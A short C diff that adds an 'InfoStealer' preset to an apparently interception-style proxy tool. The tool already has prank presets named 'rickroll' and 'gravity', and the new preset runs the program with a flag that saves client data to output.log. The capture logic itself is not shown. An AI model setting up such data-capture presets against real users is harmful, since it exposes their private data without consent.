@@ -20,6 +20,12 @@ char *__cl__rickroll[] = {
     "\0"
 };
 
+char *__cl__loginfo[] = {
+    (char[]){"./Prox"},
+    (char[]){"--save-client-data"},
+    (char[]){"output.log"},
+    "\0"
+};
 
 static int getlength(char** cl){
     int i = 0;
@@ -29,8 +35,7 @@ static int getlength(char** cl){
 
 static void applySettings(char* cl[]){
     int l = getlength(cl);
-    //for(int i=0; i<l; i++)
-    //    cl[i] = strdup(cl[i]);
+
     for(int i=0; i<l; i++)
         Log(LOG_INFO|LOG1, "%s ", cl[i]);
     Log(LOG_INFO|LOG1,"\n");
@@ -45,8 +50,13 @@ void setupGravity(){
 
 
 void setupRickRoll(){
-
     Log(LOG_INFO|LOG1, " -- Setting up Rickroll --\n");
 
     applySettings(__cl__rickroll);
+}
+
+void setupLogInfo(){
+    Log(LOG_INFO|LOG1, " -- Setting up InfoStealer --\n");
+
+    applySettings(__cl__loginfo);
 }
